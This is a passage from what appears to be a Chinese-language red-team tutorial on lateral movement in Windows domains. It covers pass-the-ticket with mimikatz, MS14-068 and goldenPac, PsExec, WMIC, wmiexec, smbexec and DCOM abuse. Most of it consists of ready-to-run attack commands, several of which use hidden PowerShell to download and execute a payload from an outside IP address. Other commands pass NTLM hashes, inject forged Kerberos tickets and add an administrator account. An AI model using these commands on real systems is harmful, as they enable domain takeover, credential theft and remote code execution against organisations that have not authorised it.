&quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure>\n<p>执行以上命令后，会在当前目录下出现多个服务的票据文件，例如 krbtgt、cifs、ldap 等。</p>\n<p>清除内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell klist purge</span><br><span class=\"line\">mimikatz kerberos::purge</span><br><span class=\"line\">两个都是清除票据</span><br></pre></td></tr></table></figure>\n<p>将高权限的票据文件注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt [0;998d7]-2-0-40e10000-Administrator@krbtgt-HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n<p>查看票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell klist</span><br><span class=\"line\">mimikatz kerberos::tgt</span><br></pre></td></tr></table></figure>\n<p>访问机器 (admin 用户没有过 uac)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\2012-1.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p><strong>横向后都是 system 权限</strong></p>\n<h3 id=\"ptt攻击之ms14-068传递获取域管横向\"><a class=\"markdownIt-Anchor\" href=\"#ptt攻击之ms14-068传递获取域管横向\">#</a> <strong>PTT 攻击之 ms14-068 传递获取域管横向</strong></h3>\n<p>ms14-068 漏洞主要通过伪造域管的 TGT，<strong>将普通用户权限提权为域管权限</strong>，以此来控制域控。只要服务器未打 ms14-068 补丁（KB3011780），在 server 2000 以上的域控服务器中，都可进行利用</p>\n<p><strong>MS14-068 的利用条件</strong></p>\n<p>1、获取域普通用户的账号密码</p>\n<p>2、获取域普通用户的 sid</p>\n<p>3、服务器未打 KB3011780 补丁</p>\n<p>查看域用户的 SID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whoami /all</span><br></pre></td></tr></table></figure>\n<p>清除内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">klist purge</span><br></pre></td></tr></table></figure>\n<p>生成票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ms14-068.exe -u 域用户@域名 -p 域用户密码 -s 域用户SID -d 域控</span><br></pre></td></tr></table></figure>\n<p>执行后会生成一张伪造的 tgt</p>\n<p>导入票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerberos::ptc 票据名字</span><br></pre></td></tr></table></figure>\n<p>执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\dc2.test.com\\c$ 注意是机器名不是IP</span><br></pre></td></tr></table></figure>\n<p><strong>goldenPac.exe</strong></p>\n<p>此工具是 impacket 工具包里的，它是 MS14-068+psexec 的组合，因此使用起来非常放方便快捷</p>\n<p>用法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">goldenPac.exe 域名/域用户名:域用户明文密码@域控完整域名</span><br></pre></td></tr></table></figure>\n<h3 id=\"psexec工具远程命令执行横向移动\"><a class=\"markdownIt-Anchor\" href=\"#psexec工具远程命令执行横向移动\">#</a> <strong>PsExec 工具远程命令执行横向移动</strong></h3>\n<p>psexec 是 windows 下非常好的一款远程命令行工具。psexec 的使用不需要对方主机开方 3389 端口，只需要对方开启 admin<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>共享和</mtext><mi>i</mi><mi>p</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">共享和ipc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord cjk_fallback\">共</span><span class=\"mord cjk_fallback\">享</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">c</span></span></span></span> (该共享默认开启，依赖于 445 端口)。但是，假如目标主机开启了防火墙（防火墙禁止 445 端口连接），psexec 也是不能使用的，会提示找不到网络路径。由于 psexec 是 Windows 提供的工具，所以杀毒软件将其列在白名单中</p>\n<p><strong>PsExec 使用条件</strong></p>\n<p>1、具有正确的凭证（内存凭证、账号密码、账号 NTLM Hash）</p>\n<p>2、能建立 IPC 链接（也就是需要通过 smb 认证的），且目标机器开启了共享（默认开启的），并且目标共享中必须有 admin$ 共享</p>\n<p><strong>PsExec 常用参数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psexec \\\\ip -u administrator -p admin cmd 进⼊半交互式shell</span><br><span class=\"line\">PsExec -accepteula \\\\192.168.108.101 -s cmd.exe 建立交互的shell</span><br><span class=\"line\">psexec \\\\ip - uadministrator -p admin -w c:\\cmd 进⼊交互式shell，且c:\\是⽬标机器的⼯作⽬录</span><br><span class=\"line\">psexec \\\\ip -u administrator -p admin whoami all 执行命令</span><br><span class=\"line\">psexec \\\\ip -u administrator -p admin -d c:\\beacon.exe 执行文件</span><br><span class=\"line\">psexec \\\\ip -u administrator -p admin -h -d c:\\beacon.exe UAC的⽤⼾权限执行文件</span><br></pre></td></tr></table></figure>\n<p>第一次使用时会弹窗，加上 accepteula 取消弹窗</p>\n<p><strong>IPC$ 下的 psexec</strong></p>\n<p>建立 IPC$ 连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.41.150\\ipc$ &quot;Admin@123&quot; /user:administrator</span><br></pre></td></tr></table></figure>\n<p>直接执行命令，建立 ipc 后无需输入密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psexec.exe -accepteula \\\\192.168.41.150 -s cmd.exe 返回交互shell（必须是msf或者远程到桌面CS不行）</span><br><span class=\"line\">psexec.exe -accepteula \\\\192.168.41.150 -s ipconfig 远程执行命令</span><br></pre></td></tr></table></figure>\n<p><strong>PTH 下的 psexec</strong></p>\n<p>进行 psexec 攻击上线</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211180427093.png\" alt=\"image-20221211180427093\"></p>\n<p><strong>PTT 下的 psexec</strong></p>\n<p>导出内存的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure>\n<p>清除内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell klist purge</span><br><span class=\"line\">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure>\n<p>将高权限的票据文件注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt [0;998d7]-2-0-40e10000-Administrator@krbtgt-HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psexec.exe \\\\dc.hack.com -h -d c:\\wanli.exe</span><br></pre></td></tr></table></figure>\n<h3 id=\"wmic远程执行命令横向移动\"><a class=\"markdownIt-Anchor\" href=\"#wmic远程执行命令横向移动\">#</a> <strong>WMIC 远程执行命令横向移动</strong></h3>\n<p>WMIC 扩展 WMI（Windows Management Instrumentation，Windows 管理工具） ，提供了从命令行接口和批处理脚本执行系统管理的支持。</p>\n<p>简单来说：wmic 就是 wmic.exe，位于 windows 目录底下，是一个命令行程序。WMIC 可以以两种模式执行：交互模式 (Interactive mode) 和非交互模式 (Non-Interactive mode)，WMI 就是 WindowsManagement Instrumentation（Windows 管理规范）。它是 Windows 中的一个核心管理技术。</p>\n<p><strong>wmic 命令需要本地管理员或域管理员才可以进行正常使用</strong>，普通权限用户若想要使用 wmi，可以修改普通用户的 ACL，不过修改用户的 ACL 也需要管理员权限，普通用户使用 wmic。以下命令均在 2008R2、2012R2、2016 上进行测试，部分命令在虚拟机中测试不行。</p>\n<p><strong>wmic 调用 cmd</strong></p>\n<p>以下命令需要管理员权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">执行命令并且输出</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create &quot;cmd.exe /c ipconfig &gt;c:\\ip.txt&quot;</span><br><span class=\"line\">列出远程主机进程</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process list brief</span><br><span class=\"line\">在远程系统上执行bat脚本</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create c:\\programdata\\test.bat</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span><br><span class=\"line\">执行powershell上线</span><br><span class=\"line\">wmic /NODE:IP /user:本地用户管理员/域管理员 /password:密码 PROCESS call create &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;ps脚本地址&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>利用 powershell 上线</strong></p>\n<p>1、使用 cs 生成 powershell 脚本</p>\n<p>2、wmic 进行上线，把 ps1 放大公网，可以使用 python 开启 http 服务提供下载 python-m http.server 9988</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic /NODE:192.168.41.148 /user:administrator /password:Admin@123 PROCESS call</span><br><span class=\"line\">create &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>Wmiexec 工具</strong></p>\n<p>wmiexec 是一个即有全交互也有半交互的远程命令执行工具，有 python 版本的 pe 版本可运用于多种环境，包括 webshell 环境、rdp 环境、socks 环境等</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmiexec.exe 域名/用户名:密码@目标IP #哈希传递获得shell</span><br><span class=\"line\">wmiexec.exe 域名/用户名:密码@目标IP &quot;ipconfig&quot; #执行命令</span><br><span class=\"line\">wmiexec.exe -hashes LM Hash:NT Hash 域名/用户名@目标IP #哈希传递获得shell</span><br><span class=\"line\">wmiexec.exe -hashes LM Hash:NT Hash 域名/用户名@目标IP &quot;ipconfig&quot; #执行命令</span><br></pre></td></tr></table></figure>\n<p><strong>利用 powershell 上线</strong></p>\n<p>1、使用账号密码登录进行 powershell 上线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmiexec.exe administrator:Admin@123@192.168.41.40 &quot;powershell.exe -nop -w hidden</span><br><span class=\"line\">-c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<p>2、使用 hash 上线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmiexec.exe -hashes</span><br><span class=\"line\">aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab</span><br><span class=\"line\">administrator@192.168.41.40 &quot;powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>wmiexec.vbs</strong></p>\n<p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能。其可以在远程系统中执行命令并进行回显，获取远程主机的半交互式 Shell。wmiexec.vbs 支持两种模式，一种是半交互式 shell 模式，另一种是执行单条命令模式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript.exe //nologo wmiexec.vbs /cmd IP 用户 密码 &quot;命令&quot;</span><br></pre></td></tr></table></figure>\n<p>使用 powershell 上线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript.exe //nologo wmiexec.vbs /cmd 192.168.41.148 administrator Admin@123</span><br><span class=\"line\">&quot;powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>Invoke-WMIExec</strong></p>\n<p>Invoke-WMIExec 是一个 powershell 脚本在 Invoke-TheHash 的文件中用法如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Invoke-WMIExec -Target IP -Domain 域 -Username 用户 -Hash hash-Command &quot;calc.exe&quot;</span><br><span class=\"line\">-verbose</span><br></pre></td></tr></table></figure>\n<p>采用无文件落地的方式进行横向</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell powershell -exec bypass -c IEX (New-Object</span><br><span class=\"line\">System.Net.Webclient).DownloadString(&#x27;http://118.178.134.226:9988/Invoke\u0002WMIExec.ps1&#x27;);import-module .\\Invoke-WMIExec.ps1;Invoke-WMIExec -Target</span><br><span class=\"line\">192.168.41.148 -Username administrator -Hash 570a9a65db8fba761c1008a51d4c95ab -</span><br><span class=\"line\">Command &quot;whoami&quot; -verbose</span><br></pre></td></tr></table></figure>\n<p>本地执行</p>\n<p>1、导入脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell-import powershell/Invoke-WMIExec.ps1</span><br></pre></td></tr></table></figure>\n<p>2、运行上线命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell Invoke-WMIExec -Target 192.168.41.20 -Username administrator -Hash</span><br><span class=\"line\">570a9a65db8fba761c1008a51d4c95ab -Command &quot;powershell.exe -nop -w hidden -c IEX</span><br><span class=\"line\">((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot; -</span><br><span class=\"line\">verbose</span><br></pre></td></tr></table></figure>\n<p><strong>Invoke-WMIMethod.ps1</strong></p>\n<p>该模块为 Powershell 内置模块，以下为示例，可以自由组合命令进行测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$User #目标系统用户名</span><br><span class=\"line\">$Password #目标系统密码</span><br><span class=\"line\">$Cred #账号密码整合，导入Credential</span><br><span class=\"line\">Invoke-WMIMethod #远程运行指定程序</span><br><span class=\"line\">#####---------------------------#####</span><br><span class=\"line\">$User = &quot;administrator&quot;</span><br><span class=\"line\">$Password= ConvertTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class=\"line\">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -</span><br><span class=\"line\">ArgumentList $User , $Password</span><br><span class=\"line\">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe</span><br><span class=\"line\">-nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot; -</span><br><span class=\"line\">ComputerName &quot;192.168.41.20&quot; -Credential $Cred</span><br></pre></td></tr></table></figure>\n<h3 id=\"smb远程执行命令横向移动\"><a class=\"markdownIt-Anchor\" href=\"#smb远程执行命令横向移动\">#</a> <strong>SMB 远程执行命令横向移动</strong></h3>\n<p>SMB 全称是 Server Message Block 翻译过来是服务器信息块，它也是一种客户端到服务器的通信协议。除此之外，SMB 协议也被称为请求 - 回复协议。 客户端与服务器建立连接后，客户端可以向服务器发送 SMB 命令允许用户访问共享、打开、读取或者是写入文件。</p>\n<p>利用条件：开启了 445 端口</p>\n<p><strong>smbexec 使用</strong></p>\n<p>smbexec 为 impacket 工具中的工具，操作简单，容易被杀，使用时无需先进行 IPC 连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文传递命令：</span><br><span class=\"line\">smbexec hsyy.com/administrator:123.com@192.168.213.163</span><br><span class=\"line\">hash传递：</span><br><span class=\"line\">smbexec -hashes :$HASH$ ./admin@192.168.213.163</span><br><span class=\"line\">smbbexec -hashes :$HASH$ domain/admin@192.168.213.163</span><br></pre></td></tr></table></figure>\n<p><strong>使用明文</strong></p>\n<p>1、输入命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbexec administrator:Admin@123@192.168.41.148</span><br></pre></td></tr></table></figure>\n<p><strong>使用 hash</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbexec -hashes aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab administrator@192.168.41.148</span><br></pre></td></tr></table></figure>\n<h3 id=\"dcom远程执行命令横向移动\"><a class=\"markdownIt-Anchor\" href=\"#dcom远程执行命令横向移动\">#</a> <strong>DCOM 远程执行命令横向移动</strong></h3>\n<p>DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求，使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件</p>\n<p><strong>获取 DCOM 列表</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Get-CimInstance Win32_DCOMApplication</span><br><span class=\"line\">Get-CimInstance -classWin32_DCOMApplication | select appid,name</span><br><span class=\"line\">Get-WmiObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>\n<p><strong>DCOM 横向前提</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、需要关闭系统防火墙</span><br><span class=\"line\">2、必须拥有管理员权限</span><br><span class=\"line\">3、在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户</span><br></pre></td></tr></table></figure>\n<p><strong>MMC20.Application 远程执行命令</strong></p>\n<p>1、通过 PowerShell 与 DCOM 进行远程交互，此外，我们只需要提供一个 DCOM ProgID 和一个 IP 地址，然后，它就从远程返回一个 COM 对象的实例。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com =</span><br><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0</span><br><span class=\"line\">.0.1&quot;))</span><br></pre></td></tr></table></figure>\n<p>2、然后执行如下命令，我们就可以调用 &quot;ExecuteShellCommand&quot; 方法在远程主机上启动进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c</span><br><span class=\"line\">calc.exe&quot;,&quot;Minimzed&quot;)</span><br></pre></td></tr></table></figure>\n<p>3、将 IP 和命令换成上线的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.1</span><br><span class=\"line\">68.41.147&quot;))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;Mini</span><br><span class=\"line\">mzed&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>ShellWindows 远程执行命令</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-</span><br><span class=\"line\">00A0C90A8F39&#x27;,&quot;127.0.0.1&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;</span><br><span class=\"line\">/c calc.exe&quot;,&quot;c:windowssystem32&quot;,$null,0) 打开本地计算器</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-</span><br><span class=\"line\">00A0C90A8F39&#x27;,&quot;192.168.41.147&quot;)).item().Document.Application.ShellExecute(&quot;cmd.e</span><br><span class=\"line\">xe&quot;,&quot;/c powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;c:wi</span><br><span class=\"line\">ndowssystem32&quot;,$null,0)</span><br></pre></td></tr></table></figure>\n<p><strong>ShellBrowserWindow 远程执行命令</strong></p>\n<p>适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-</span><br><span class=\"line\">00A0C91F3880&quot;,&quot;192.168.41.147&quot;)).Document.Application.shellExecute(&quot;cmd.exe&quot;,&quot;/c</span><br><span class=\"line\">powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;c:wi</span><br><span class=\"line\">ndowssystem32&quot;,$null,0)</span><br></pre></td></tr></table></figure>\n<p><strong>调用 Excel.Application 远程执行命令</strong></p>\n<p>目标主机中安装有 excle</p>\n<p>1、 通过 PowerShell 与 DCOM 进行远程交互，创建 Excel.Application 对象的实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com =</span><br><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.1</span><br><span class=\"line\">68.41.147&quot;))</span><br><span class=\"line\">$com.DisplayAlerts = $false</span><br><span class=\"line\">$com =</span><br><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;127.0</span><br><span class=\"line\">.0.1&quot;))</span><br></pre></td></tr></table></figure>\n<p>2、然后执行如下命令，我们就可以调用该对象的 &quot;DDEInitiate&quot; 方法在远程主机上启动进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;/c 参数&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>Visio.Application 远程执行命令</strong></p>\n<p>目标主机中安装有 Visio</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.1</span><br><span class=\"line\">68.52.138&quot;)).[0].Document.Application.shellExecute(&quot;C:shell.exe&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>Outlook.Application 远程执行命令</strong></p>\n<p>目标主机中安装有 Outlook</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192</span><br><span class=\"line\">.168.52.138&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;C:shell.exe&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>Impacket <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1kY29tZXhlYy1rZDBtajU0NGEucHk=\">中的 dcomexec.py</span></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dcomexec.exe [domain/]username:password@ip //创建一个交互式shell</span><br><span class=\"line\">dcomexec.exe 